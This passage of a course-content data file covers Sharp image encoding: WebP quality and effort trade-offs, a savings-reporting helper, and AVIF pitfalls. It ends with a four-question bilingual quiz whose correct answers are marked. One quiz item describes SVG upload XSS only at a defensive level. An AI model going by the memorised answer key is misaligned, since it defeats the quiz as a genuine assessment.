  .webp({ quality: WEBP_QUALITY, effort: 4 })
  .toBuffer({ resolveWithObject: true })
</code></pre>

<p>Và từ comment đầu file, lý do chọn chính WebP: <em>&quot;nhỏ hơn JPEG 25-35% ở cùng chất lượng cảm nhận; hỗ trợ alpha, animation, và lossy/lossless trong một format; hỗ trợ trình duyệt 97%+ tính đến 2026.&quot;</em> Một format bao được ảnh chụp, trong suốt, và animation đáng giá hơn về mặt vận hành so với việc vắt nốt 5% cuối cùng từ một ma trận format theo từng loại ảnh.</p>

<h3>Báo cáo phần thắng</h3>
<pre><code class="language-javascript">// src/storage/imageOptimizer.ts — dòng log mà cả người dùng lẫn dev đều thấy
export function formatSavings(originalSize, optimizedSize) {
  if (originalSize === 0) return '0%'
  const saved = ((originalSize - optimizedSize) / originalSize) * 100
  if (saved &lt; 0) return \`\${Math.abs(saved).toFixed(0)}% LARGER\`
  return \`\${saved.toFixed(0)}% smaller\`
}
</code></pre>

<p>Nhánh <code>LARGER</code> mới là cái thú vị. Re-encode không phải lúc nào cũng thắng: một JPEG nhỏ vốn đã tối ưu, một screenshot vốn đã là PNG nén tốt, hoặc một ảnh mà format nguồn hợp với nó hơn — tất cả đều có thể ra to hơn. Ghi log điều đó rõ ràng nghĩa là bạn phát hiện được, thay vì âm thầm ship file phình ra. Nếu bạn thấy <code>LARGER</code> thường xuyên, đó là tín hiệu để thêm nhánh &quot;giữ bản gốc nếu bản re-encode không nhỏ hơn&quot;.</p>

<div class="pitfall">
<p><strong>Bẫy — chép một con số quality của AVIF từ config WebP.</strong> Hai thang không liên quan. AVIF q=80 sinh ra file <em>lớn hơn</em> WebP q=80 65% mà không có lợi ích nhìn thấy. Tương đương thô là AVIF q=50 ≈ WebP q=80; luôn tinh chỉnh lại khi đổi format thay vì mang con số qua.</p>
</div>

<div class="pitfall">
<p><strong>Bẫy — tin hướng của thang <code>effort</code> theo một comment.</strong> Nó đã lật giữa các phiên bản libvips, và chính comment của kho cũng đã cũ ở điểm này. Hãy đo: bấm giờ <code>effort: 0</code> so với <code>effort: 6</code> trên phiên bản bạn cài. Cái nào chậm hơn là đầu &quot;nén chăm hơn&quot;.</p>
</div>

<div class="callout">
<p><strong>Một câu.</strong> Quality và effort là hai núm độc lập — quality thay đổi ảnh trông thế nào và đường cong của nó gãy quanh 80 với WebP (dưới đó artifact trở nên mô tả được, trên đó kích thước tăng theo cấp số nhân cho những lợi ích vô hình), trong khi effort chỉ đổi CPU-lấy-byte ở quality cố định và gãy ở 4 (lên 6 tốn 3.5× CPU cho 2.7% byte ít hơn, chỉ đáng cho tài sản phục vụ hàng triệu lần); thang quality của AVIF <em>không phải</em> của WebP (q=50 ≈ WebP q=80, và chép 80 qua làm file lớn hơn 65%), và bạn nên đo điểm gãy trên ảnh đại diện của chính mình thay vì tin mặc định của bất kỳ ai công bố.</p>
</div>

<h3>Nguồn</h3>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">Sharp — output options</span><span class="lc-sub">sharp.pixelplumbing.com/api-output — mọi tham số quality/effort theo từng format.</span></span></div>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">Google — WebP compression study</span><span class="lc-sub">developers.google.com/speed/webp/docs/webp_study — các phép đo size-vs-quality gốc.</span></span></div>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">mozjpeg</span><span class="lc-sub">github.com/mozilla/mozjpeg — encoder đằng sau <code>jpeg({ mozjpeg: true })</code>.</span></span></div>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">Kho: src/storage/imageOptimizer.ts</span><span class="lc-sub"><code>WEBP_QUALITY = 80</code>, <code>effort: 4</code>, và <code>formatSavings()</code> với nhánh <code>LARGER</code>.</span></span></div>
</div>
`,
    },

    {
      title: '2.4 — Chapter 2 quiz|||2.4 — Kiểm tra Chương 2',
      slug: 'mp-2-4-quiz',
      type: 'QUIZ',
      description: 'Bốn câu về SVG, ảnh động, và tinh chỉnh encoder.',
      content: `<div class="ml-en"><span class="eyebrow">Chapter 2 · Quiz</span><h2>What Chapter 2 established</h2></div><div class="ml-vi"><span class="eyebrow">Chương 2 · Kiểm tra</span><h2>Chương 2 đã dựng được gì</h2></div>`,
      quiz: {
        timeLimitSeconds: 400,
        questions: [
          {
            question: 'Your app renders user images only via <code>&lt;img src&gt;</code>, where SVG scripts do not run. Is accepting SVG uploads safe?|||App của bạn chỉ render ảnh người dùng qua <code>&lt;img src&gt;</code>, nơi script SVG không chạy. Nhận upload SVG có an toàn không?',
            options: [
              'No — the attacker does not need your page. They send the victim the direct CDN URL; navigating to an .svg executes its script with your media origin. Reject SVG at two independent gates (MIME set AND filename extension, rejecting if either matches, since the client controls both), or sanitize with DOMPurify and serve from a cookie-less origin.|||Không — kẻ tấn công không cần trang của bạn. Họ gửi nạn nhân URL CDN trực tiếp; điều hướng tới một .svg chạy script của nó với origin media của bạn. Từ chối SVG ở hai cổng độc lập (tập MIME VÀ đuôi tên file, từ chối nếu một trong hai khớp, vì client điều khiển cả hai), hoặc làm sạch bằng DOMPurify và phục vụ từ origin không cookie.',
              'Yes — <code>&lt;img&gt;</code> is a sandboxed context, that is sufficient|||Có — <code>&lt;img&gt;</code> là ngữ cảnh sandbox, thế là đủ',
              'Yes, as long as you check the MIME type is image/svg+xml|||Có, miễn là bạn kiểm MIME type là image/svg+xml',
              'Yes — Sharp strips scripts when it reads the file|||Có — Sharp bóc script khi nó đọc file',
            ],
            correctIndex: 0, points: 1,
          },
          {
            question: 'Users report uploaded GIFs "become still images". No errors in the logs. What happened?|||Người dùng báo GIF upload lên "thành ảnh tĩnh". Không lỗi nào trong log. Chuyện gì đã xảy ra?',
            options: [
              'Sharp reads only frame 1 unless you pass <code>{ animated: true }</code> to the CONSTRUCTOR — it fails silently, no exception. Check <code>metadata().pages</code> before encoding, and remember the pixel budget then becomes <code>width × height × pages</code> since libvips loads frames as one tall strip (which is also why you must resize by width only).|||Sharp chỉ đọc frame 1 trừ khi bạn truyền <code>{ animated: true }</code> vào CONSTRUCTOR — nó thất bại trong im lặng, không exception. Kiểm <code>metadata().pages</code> trước khi encode, và nhớ ngân sách pixel khi đó thành <code>width × height × pages</code> vì libvips nạp frame thành một dải cao (cũng là vì sao bạn phải resize chỉ theo width).',
              'GIF is unsupported by Sharp — use FFmpeg instead|||Sharp không hỗ trợ GIF — dùng FFmpeg thay thế',
              'The GIFs exceeded the pixel budget and were silently truncated|||GIF vượt ngân sách pixel và bị cắt cụt âm thầm',
              'WebP cannot store animation — keep the GIF|||WebP không lưu được animation — giữ GIF',
            ],
            correctIndex: 0, points: 1,
          },
          {
            question: 'You switch a pipeline from <code>webp({ quality: 80 })</code> to <code>avif({ quality: 80 })</code>. Files get bigger. Why?|||Bạn chuyển pipeline từ <code>webp({ quality: 80 })</code> sang <code>avif({ quality: 80 })</code>. File to ra. Vì sao?',
            options: [
              'AVIF and WebP quality scales are not comparable. AVIF q=50 ≈ WebP q=80 perceptually; AVIF q=80 measured 681 KB against WebP q=80 at 412 KB — 65% larger for no visible gain. Re-tune quality when switching formats instead of carrying the number across; at q=50 AVIF is 220 KB, 47% smaller than the WebP.|||Thang quality của AVIF và WebP không so được. AVIF q=50 ≈ WebP q=80 về cảm nhận; AVIF q=80 đo được 681 KB so với WebP q=80 ở 412 KB — lớn hơn 65% mà không có lợi ích nhìn thấy. Tinh chỉnh lại quality khi đổi format thay vì mang con số qua; ở q=50 AVIF là 220 KB, nhỏ hơn WebP 47%.',
              'AVIF is simply a worse format than WebP|||AVIF đơn giản là format tệ hơn WebP',
              'You forgot to set effort — AVIF defaults to effort 0|||Bạn quên đặt effort — AVIF mặc định effort 0',
              'AVIF cannot compress photos, only graphics|||AVIF không nén được ảnh chụp, chỉ đồ hoạ',
            ],
            correctIndex: 0, points: 1,
          },
          {
            question: 'A hero image on your landing page is served ~10M times/month. Which encoder settings, and why?|||Một ảnh hero trên trang chủ được phục vụ ~10 triệu lần/tháng. Cài đặt encoder nào, và vì sao?',
            options: [
              'Raise effort to its maximum (6 for WebP) while keeping quality at the perceptual knee. Effort trades CPU for bytes at identical visual quality; the measured 4→6 step costs 3.5× CPU for 2.7% fewer bytes, which is a bad trade per-upload but an excellent one when the encode happens once and the bytes ship 10M times (~100+ GB of bandwidth).|||Nâng effort lên tối đa (6 với WebP) trong khi giữ quality ở điểm gãy cảm nhận. Effort đổi CPU lấy byte ở cùng chất lượng thị giác; bước 4→6 đo được tốn 3.5× CPU cho 2.7% byte ít hơn, một đánh đổi tệ cho mỗi-upload nhưng tuyệt vời khi encode xảy ra một lần và byte ship 10 triệu lần (~hơn 100 GB băng thông).',
              'Raise quality to 100 — the hero image deserves it|||Nâng quality lên 100 — ảnh hero xứng đáng',
              'Lower effort to 0 so the page builds faster|||Hạ effort xuống 0 để trang build nhanh hơn',
              'Settings do not matter — the CDN recompresses anyway|||Cài đặt không quan trọng — CDN dù sao cũng nén lại',
            ],
            correctIndex: 0, points: 1,
          },
        ],
      },
    },
  ],
};
